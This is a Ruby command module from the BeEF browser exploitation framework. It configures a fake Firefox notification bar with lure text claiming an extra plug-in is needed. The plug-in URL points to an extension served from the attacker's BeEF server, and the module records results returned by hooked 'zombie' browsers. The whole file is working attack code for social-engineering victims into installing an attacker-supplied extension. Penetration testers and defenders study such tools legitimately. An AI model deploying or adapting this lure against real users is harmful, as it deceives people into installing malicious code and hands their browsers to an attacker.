#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_notification_ff < BeEF::Core::Command

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = @configuration.get("beef.http.public")      || @configuration.get("beef.http.host")
    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
    url = "#{proto}://#{beef_host}:#{beef_port}/api/ipec/ff_extension"
    return [
      {'name' => 'url', 'ui_label' => 'Plugin URL', 'value' => url, 'width'=>'150px'},
      { 'name' => 'notification_text',
        'description' => 'Text displayed in the notification bar',
        'ui_label' => 'Notification text',
        'value' => "An additional plug-in is required to display some elements on this page."
      }
    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end
  
end
